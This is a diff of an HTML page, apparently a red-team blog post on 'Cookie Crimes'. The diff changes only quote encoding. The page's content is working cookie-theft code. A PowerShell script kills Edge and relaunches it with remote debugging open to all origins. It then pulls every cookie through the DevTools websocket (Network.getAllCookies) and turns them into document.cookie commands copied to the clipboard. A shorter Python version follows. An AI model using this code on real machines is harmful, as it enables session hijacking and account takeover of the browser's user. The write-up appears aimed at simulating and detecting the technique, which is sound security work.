@@ -164,7 +164,7 @@
 <h4 id="malware-launches-browser"><strong>Malware launches browser</strong></h4>
 <p>Here is an example how this can be simulated with <code>Powershell.exe</code> and we&rsquo;ll use the <code>Edge</code> browser:</p>
 <pre tabindex="0"><code>Get-Process msedge | Stop-Process
-Start-Process &quot;msedge.exe&quot; &quot;https://outlook.com --remote-debugging-port=9222 --remote-allow-origins=*&quot;
+Start-Process &#34;msedge.exe&#34; &#34;https://outlook.com --remote-debugging-port=9222 --remote-allow-origins=*&#34;
 </code></pre><p>Now the user&rsquo;s browser is relaunched, and the debug port is enabled.</p>
 <h4 id="malware-retrieves-the-debugging-websocket-details"><strong>Malware retrieves the debugging websocket details</strong></h4>
 <p>Before we can connect to the debugging websocket, we need to know its location. This can be quickly found by downloading the <code>/json</code> configuration information:</p>
@@ -204,9 +204,9 @@ from this origin or --remote-allow-origins=* to allow all origins.
 <p>PowerShell Implementation for Cookie Crimes. A lot of this code was created with the help of ChatGPT.</p>
 <p>Launching browser with remote debugging on (note this first terminates all instances, so if you want to be less intrusive you can copy the user profile or just wait a bit longer):</p>
 <pre tabindex="0"><code>Get-Process msedge | Stop-Process
-Start-Process &quot;msedge.exe&quot; &quot;https://outlook.com --remote-debugging-port=9222 --remote-allow-origins=* --restore-last-session&quot;
+Start-Process &#34;msedge.exe&#34; &#34;https://outlook.com --remote-debugging-port=9222 --remote-allow-origins=* --restore-last-session&#34;
 </code></pre><p>Connect and invoke the web socket API <code>Network.getAllCookies</code></p>
-<pre tabindex="0"><code>$jsonResponse = Invoke-WebRequest 'http://localhost:9222/json' -UseBasicParsing
+<pre tabindex="0"><code>$jsonResponse = Invoke-WebRequest &#39;http://localhost:9222/json&#39; -UseBasicParsing
 $devToolsPages = ConvertFrom-Json $jsonResponse.Content
 $ws_url = $devToolsPages[0].webSocketDebuggerUrl
 
@@ -214,7 +214,7 @@ $ws = New-Object System.Net.WebSockets.ClientWebSocket
 $uri = New-Object System.Uri($ws_url)
 $ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()
 
-$GET_ALL_COOKIES_REQUEST = '{&quot;id&quot;: 1, &quot;method&quot;: &quot;Network.getAllCookies&quot;}'
+$GET_ALL_COOKIES_REQUEST = &#39;{&#34;id&#34;: 1, &#34;method&#34;: &#34;Network.getAllCookies&#34;}&#39;
 $buffer = [System.Text.Encoding]::UTF8.GetBytes($GET_ALL_COOKIES_REQUEST)
 $segment = New-Object System.ArraySegment[byte] -ArgumentList $buffer, 0, $buffer.Length
 $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
@@ -228,44 +228,44 @@ do {
     $completeMessage.Append($receivedString)
 } while (-not $result.EndOfMessage)
 
-$ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, &quot;Closing&quot;, [System.Threading.CancellationToken]::None).Wait()
+$ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, &#34;Closing&#34;, [System.Threading.CancellationToken]::None).Wait()
 
 try {
     $response = ConvertFrom-Json $completeMessage.ToString()
     $cookies = $response.result.cookies
     # $cookies
 } catch {
-    Write-Host &quot;Error parsing JSON data.&quot;
+    Write-Host &#34;Error parsing JSON data.&#34;
 }
 
-$cookieName = &quot;*&quot;  
+$cookieName = &#34;*&#34;  
 $specificCookies = $cookies | Where-Object { $_.name -like $cookieName }
 
 $cookieCommands = @()  
 foreach ($cookie in $specificCookies) {
-    $escapedValue = $cookie.value -replace &quot;'&quot;, &quot;\'&quot;
-    $escapedPath = $cookie.path -replace &quot;'&quot;, &quot;\'&quot;
-    $escapedDomain = $cookie.domain -replace &quot;'&quot;, &quot;\'&quot;
+    $escapedValue = $cookie.value -replace &#34;&#39;&#34;, &#34;\&#39;&#34;
+    $escapedPath = $cookie.path -replace &#34;&#39;&#34;, &#34;\&#39;&#34;
+    $escapedDomain = $cookie.domain -replace &#34;&#39;&#34;, &#34;\&#39;&#34;
 
-    $cookieCommand = &quot;document.cookie='&quot; + $cookie.name + &quot;=&quot; + $escapedValue +
-                     &quot;; Path=&quot; + $escapedPath + &quot;; Domain=&quot; + $escapedDomain + &quot;;secure';&quot;
+    $cookieCommand = &#34;document.cookie=&#39;&#34; + $cookie.name + &#34;=&#34; + $escapedValue +
+                     &#34;; Path=&#34; + $escapedPath + &#34;; Domain=&#34; + $escapedDomain + &#34;;secure&#39;;&#34;
     $cookieCommands += $cookieCommand
 }
 
 # Join all commands into one long string to be executed in a browser console
-$allCookieCommands = $cookieCommands -join &quot; &quot;
+$allCookieCommands = $cookieCommands -join &#34; &#34;
 Write-Host $allCookieCommands
 Set-Clipboard -Value $allCookieCommands
 </code></pre><h3 id="python-version-cookie-crimes">Python version (Cookie Crimes)</h3>
 <p>Here are the key lines of <a href="https://github.com/defaultnamehere/cookie_crimes/blob/master/cookie_crimes.py">Python code</a> to grab the cookies:</p>
-<pre tabindex="0"><code>ws_url=&quot;ws://localhost:9222/devtools/page/GRAB_FROM_JSON_ENDPOINT&quot;
+<pre tabindex="0"><code>ws_url=&#34;ws://localhost:9222/devtools/page/GRAB_FROM_JSON_ENDPOINT&#34;
 ws = websocket.create_connection(ws_url)
-GET_ALL_COOKIES_REQUEST = json.dumps({&quot;id&quot;: 1, &quot;method&quot;: &quot;Network.getAllCookies&quot;})
+GET_ALL_COOKIES_REQUEST = json.dumps({&#34;id&#34;: 1, &#34;method&#34;: &#34;Network.getAllCookies&#34;})
 ws.send(GET_ALL_COOKIES_REQUEST)
 result = ws.recv()
 ws.close()
 response = json.loads(result)
-cookies = response[&quot;result&quot;][&quot;cookies”]
+cookies = response[&#34;result&#34;][&#34;cookies”]
 </code></pre><h2 id="references">References</h2>
 <ul>
 <li><a href="https://attack.mitre.org/techniques/T1539/">Steal Web Session Cookie</a></li>
